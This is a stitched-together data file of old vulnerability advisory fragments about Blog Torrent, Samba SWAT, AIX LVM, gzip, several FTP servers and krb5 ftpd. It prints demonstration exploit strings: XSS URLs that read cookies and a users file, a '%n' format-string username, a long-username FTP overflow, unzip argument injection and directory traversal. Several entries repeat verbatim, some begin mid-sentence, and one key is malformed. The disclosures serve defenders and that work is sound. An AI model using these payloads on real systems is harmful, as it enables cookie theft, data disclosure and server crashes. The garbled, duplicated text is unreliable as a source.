    "Description": "Lostmon reported an input validation vulnerability in Blog Torrent.  A remote user can conduct cross-site scripting attacks.\nIt is reported that 'btdownload.php' does not properly validate user-supplied input in the 'file' parameter to filter HTML code. A remote user can create a specially crafted URL that, when loaded by a target user, will cause arbitrary scripting code to be executed by the target user's browser. The code will originate from the site running the Blog Torrent software and will run in the security context of that site. As a result, the code will be able to access the target user's cookies (including authentication cookies), if any, associated with the site, access data recently submitted by the target user via web form to the site, or take actions on the site acting as the target user.  A demonstration exploit URL is provided:\n\nhttp://[target]/bittorrent_module/btdownload.php?file=<script>alert(document.cookie)</script>\n\nA remote user can exploit this to obtain username and hashed password information stored on the system.  Some demonstration exploit URLs are provided:\n\nhttp://[target]/torrent_blog/btdownload.php?file=<iframe%20src=../data/users></iframe>\n\nhttp://[target]/torrent_blog/btdownload.php?file=<iframe%20src=http://[target]/torrent_blog/data/users></iframe>",

A remote user may be able to execute arbitrary code on the target system.\nEvgeny Demidov reported that there is a buffer overflow in the Samba Web Administration Tool (SWAT) in versions 3.0.2 - 3.0.4.  A remote user can supply a specially crafted HTTP Basic Authentication header containing an invalid Base64 character to trigger the overflow and execute arbitrary code on the target system [CVE: CVE-2004-0600].\n\nThe vendor reported that the affected code is also used to decode LDAP sambaMungedDial attribute values on systems that use the ldapsam passdb backend.  Although the vendor believes that this is not exploitable, LDAP users are encouraged to verify that the DIT only allows write access to sambaSamAccount attributes by a sufficiently authorized user.\n\nThe vendor was reportedly notified on July 14, 2004.\n\nThe vendor discovered a separate buffer overflow in the code that processes the 'mangling method = hash' option from the 'smb.conf' file [CVE: CVE-2004-0686].

A local user with certain privileges may be able to execute arbitrary code.\nIBM reported that they discovered that some LVM commands use temporary files in an unsafe manner [CVE: CVE-2004-0545].  A local user can create a symbolic link (symlink) from a critical file on the system to one of the temporary files.  Then, when the affected LVM command is run, the symlinked file will be overwritten.  IBM reports that this may be exploited to cause data destruction or denial of service conditions.\n\nIt is also reported that the 'putlvcb' and 'getlvcb' commands contain buffer overflows [CVE: CVE-2004-0544].  A local user with \"system group privileges\" can invoke the commands to execute arbitrary code.",

[Editor's note:  This is not a Microsoft product.]\nIt is reported that the server does not specify the proper format string when processing user-supplied input via the 'username' field. A remote user can reportedly supply a specially crafted username value to trigger the flaw.  It may be possible to cause arbitrary code to be executed, according to the report.\n\nAs a demonstration exploit, a remote user can connect to the target server and attempt to authenticate with the username of '%n%n%n%n' to cause the target server to crash.\n\nThe vendor has reportedly been notified.",

The path is composed of the current working directory name and a user-specified file name, according to the report.\n\nThe flaw can reportedly be triggered using the STOR, RETR, APPE, DELE, MKD, RMD, \tSTOU, and RNTO commands.\n\nThe following notification timeline is provided:\n\nJune  1, 2003\tsecurity@wu-ftpd.org has been notified\nJune  9, 2003\tRequest for confirmation of receipt sent to security@wu-ftpd.org\nJune 11, 2003\tResponse received from Kent Landfield\nJuly  3, 2003   Request for status update sent\nJuly 19, 2003\tvendor-sec list notified\nJuly 31, 2003\tCoordinated public disclosure",

A local user can view this file to obtain FTP account passwords and potentially obtain elevated privileges.  A remote user can also obtain this information via a file disclosure vulnerability that has been previously reported for version 2.03 but apparently still exists in version 2.10.\n\nA remote user can view files located on the server.  A remote user can traverse the directory by requesting a direct path to a file or directory ('DIR c:\\') or by using various '..\\' directory traversal strings.\n\nSNS Research confirms that the new version of the server is still vulnerable to previously reported denial of service attacks.  A remote user can a string of 2050 bytes or more to the server to cause it to crash.  The server will start consuming 100% cpu resources and will become unresponsive. A restart of the application is required to regain full functionality.\n\nIt is also reported that the PowerFTP server does not properly parse relative path directory information, so a remote user can view the full system path of the current directory by using a 'PWD' command.\n\nIt is also noted that the PowerFTP client software (which is distributed with the PowerFTP server package) contains multiple buffer overflow conditions.\n\nThe vendor has reportedly been notified.",

A remote user can cause the FTP server to crash or execute arbitrary code.\nIt is reported that this server component is used in other FTP server products, including the Mollensoft FTP Server and Hyperion FTP Server.\n\nThe report indicates that when the FTP server attempts to return a response containing user-supplied input, a buffer overflow can be triggered due to a flawed wsprintf() function call.\n\nThe FTP service must be restarted manually to return to normal operations.\n\nA demonstration exploit transcript is provided:\n\ntelnet [victim] 21\nUSER AAAA...[995-1017]...AAAA\n\nThis demonstration will trigger a crash when the FTP server attempts to return the \"331 Password required for %s\" error message.  The total length of the response will overflow a 1024 byte buffer, according to the report.\n\nA similar exploit can be achieved by triggering the \"500\" response (command not understood).  Secunia notes that this behavior was reported in April 2003 by Moran Zavdi as affecting Hyperion FTP Server 3.0.0.\n\nTo determine if your FTP server is potentially affected, you can reportedly search for the \"FTPServX.dll\" or \"FTPServX.ocx\" files on your system.\n\nThe following extensive notification timeline is provided:\n\n10/04/2003 - Vulnerability discovered in Hyperion FTP Server.\n11/04/2003 - Vendor notified (support@mollensoft.com).\n22/04/2003 - Vendor contacted again requesting acknowledgment.\n22/04/2003 - Vendor confirms vulnerability and states that it will be fixed in version 3.5.2.\n26/04/2003 - Vendor releases version 3.5.2.\n28/04/2003 - Vulnerability still present in latest version.

The remote user can set the target 'username' to the desired target file (e.g., \"../../site/incoming/file\").  Then, the system will write the formatted line to the target file instead of the username file.\n\nA remote authenticated user is, by design, permitted to check, list, and verify uploaded zip files using 'unzip'.  However, the user can create specially crafted command arguments to cause the unzip program to extract files.  A demonstration exploit is provided:\n\nsite ziplist --l --v file\n\nIt is also reported that certain configuration files are root owned files, requiring that the software change its effective user id (euid) to manipulate the files.

If the target FTP server is located behind a firewall, for example, the remote user may be able to gain access to ostensibly protected hosts.  \n\nThis bounce attack method has been well known for many years and is discussed in a CERT advisory from December 1997:\n\nhttp://www.cert.org/advisories/CA-1997-27.html\n\nSome demonstration exploit transcripts are provided in the Source Message.\n\nThe vendor has reportedly been notified.",

On those affected FTP servers, a remote user may execute arbitrary code.\nA buffer overlow reportedly exists in /bin/gzip.  A local user can supply a long file name (longer than the 1024 byte buffer) to trigger the overflow and cause arbitrary code to be executed with the privileges of the user or process calling /bin/gzip.  If this is a local user, then there is no vulnerability.  If this is an FTP server (or other type of server process) that is calling /bin/gzip on behalf of a remote user, then there may be a vulnerability.\n\nIt is reported that many FTP servers use /bin/gzip for file compression and, therefore, allow remote users to execute arbitrary code by invoking gzip on a long file name.  The code will execute with the privileges of the FTP server.\n\nThe specific FTP servers that are affected were not reported.\n\n[Editor's note:  We have categorized this as \"Application (File Transfer)\" rather than \"Application (Generic)\" because the buffer overflow in the gzip application only creates a vulnerability when used by FTP (or other) server processes in response to a remote user's actions.]",

    "Description": "A buffer overflow vulnerability was reported in the gzip file compression utility, used by many FTP servers to allow remote users to compress files for download.  On those affected FTP servers, a remote user may execute arbitrary code.\nA buffer overlow reportedly exists in /bin/gzip.  A local user can supply a long file name (longer than the 1024 byte buffer) to trigger the overflow and cause arbitrary code to be executed with the privileges of the user or process calling /bin/gzip.  If this is a local user, then there is no vulnerability.  If this is an FTP server (or other type of server process) that is calling /bin/gzip on behalf of a remote user, then there may be a vulnerability.\n\nIt is reported that many FTP servers use /bin/gzip for file compression and, therefore, allow remote users to execute arbitrary code by invoking gzip on a long file name.  The code will execute with the privileges of the FTP server.\n\nThe specific FTP servers that are affected were not reported.\n\n[Editor's note:  We have categorized this as \"Application (File Transfer)\" rather than \"Application (Generic)\" because the buffer overflow in the gzip application only creates a vulnerability when used by FTP (or other) server processes in response to a remote user's actions.]",

A remote user can also obtain this information via a file disclosure vulnerability that has been previously reported for version 2.03 but apparently still exists in version 2.10.\n\nA remote user can view files located on the server.  A remote user can traverse the directory by requesting a direct path to a file or directory ('DIR c:\\') or by using various '..\\' directory traversal strings.\n\nSNS Research confirms that the new version of the server is still vulnerable to previously reported denial of service attacks.  A remote user can a string of 2050 bytes or more to the server to cause it to crash.  The server will start consuming 100% cpu resources and will become unresponsive. A restart of the application is required to regain full functionality.\n\nIt is also reported that the PowerFTP server does not properly parse relative path directory information, so a remote user can view the full system path of the current directory by using a 'PWD' command.\n\nIt is also noted that the PowerFTP client software (which is distributed with the PowerFTP server package) contains multiple buffer overflow conditions.\n\nThe vendor has reportedly been notified.",

    "Description": "A buffer overflow vulnerability was reported in the gzip file compression utility, used by many FTP servers to allow remote users to compress files for download.  On those affected FTP servers, a remote user may execute arbitrary code.\nA buffer overlow reportedly exists in /bin/gzip.  A local user can supply a long file name (longer than the 1024 byte buffer) to trigger the overflow and cause arbitrary code to be executed with the privileges of the user or process calling /bin/gzip.  If this is a local user, then there is no vulnerability.  If this is an FTP server (or other type of server process) that is calling /bin/gzip on behalf of a remote user, then there may be a vulnerability.\n\nIt is reported that many FTP servers use /bin/gzip for file compression and, therefore, allow remote users to execute arbitrary code by invoking gzip on a long file name.  The code will execute with the privileges of the FTP server.\n\nThe specific FTP servers that are affected were not reported.\n\n[Editor's note:  We have categorized this as \"Application (File Transfer)\" rather than \"Application (Generic)\" because the buffer overflow in the gzip application only creates a vulnerability when used by FTP (or other) server processes in response to a remote user's actions.]",
    "Impact'": "A remote user may execute arbitrary code with the privileges of the process using gzip.  If the process using gzip is a remote FTP server, then the remote user can execute arbitrary code on the FTP server with the privileges of the FTP server process.",

A remote user can also conduct 'bounce attacks' against arbitrary ports on arbitrary remote servers.\nIt is reported that the FTP server does not close sockets that are allocated when a remote user invokes the PASV command.  A remote user can connect repeatedly to the server to cause it to listen on all ports from 1024 to 5000, after which no other remote users can use the PASV command.  A restart is required to return the server to normal operations.\n\nIt is also reported that the FTP server can be used in a 'bounce attack', as there is apparently no restriction on the IP address or the port number that the server will open the data connection to.\n\nA remote user can connect to the EServ FTP server and use the PORT command to instruct the server to open a return connection to an arbitrary IP address at an arbitrary port number.\n\nNote that this behavior is specified by the applicable RFCs. However, many FTP servers allow for the PORT command to be restricted to avoid FTP bounce attacks.\n\nFor more information on FTP bounce attacks, see:\n\nhttp://www.cert.org/tech_tips/ftp_port_attacks.html",

    "Description": "A buffer overflow vulnerability was reported in the gzip file compression utility, used by many FTP servers to allow remote users to compress files for download.  On those affected FTP servers, a remote user may execute arbitrary code.\nA buffer overlow reportedly exists in /bin/gzip.  A local user can supply a long file name (longer than the 1024 byte buffer) to trigger the overflow and cause arbitrary code to be executed with the privileges of the user or process calling /bin/gzip.  If this is a local user, then there is no vulnerability.  If this is an FTP server (or other type of server process) that is calling /bin/gzip on behalf of a remote user, then there may be a vulnerability.\n\nIt is reported that many FTP servers use /bin/gzip for file compression and, therefore, allow remote users to execute arbitrary code by invoking gzip on a long file name.  The code will execute with the privileges of the FTP server.\n\nThe specific FTP servers that are affected were not reported.\n\n[Editor's note:  We have categorized this as \"Application (File Transfer)\" rather than \"Application (Generic)\" because the buffer overflow in the gzip application only creates a vulnerability when used by FTP (or other) server processes in response to a remote user's actions.]",

    "Description": "A buffer overflow vulnerability was reported in the gzip file compression utility, used by many FTP servers to allow remote users to compress files for download.  On those affected FTP servers, a remote user may execute arbitrary code.\nA buffer overlow reportedly exists in /bin/gzip.  A local user can supply a long file name (longer than the 1024 byte buffer) to trigger the overflow and cause arbitrary code to be executed with the privileges of the user or process calling /bin/gzip.  If this is a local user, then there is no vulnerability.  If this is an FTP server (or other type of server process) that is calling /bin/gzip on behalf of a remote user, then there may be a vulnerability.\n\nIt is reported that many FTP servers use /bin/gzip for file compression and, therefore, allow remote users to execute arbitrary code by invoking gzip on a long file name.  The code will execute with the privileges of the FTP server.\n\nThe specific FTP servers that are affected were not reported.\n\n[Editor's note:  We have categorized this as \"Application (File Transfer)\" rather than \"Application (Generic)\" because the buffer overflow in the gzip application only creates a vulnerability when used by FTP (or other) server processes in response to a remote user's actions.]",

The vendor notes that recent versions of ftpd (krb5-1.2 or later) do not contain the ftpglob() buffer overflow vulnerability.\n\nThe vendor also warns that if remote users are able to authenticate to the FTP daemon, they may be able to exploit a vulnerability in radix_encode() caused by a lack of appropriate bounds checking.  Login access is not required to trigger this vulnerability; the ability to force arbitrary data to be base64-encoded by radix_encode() is sufficient.
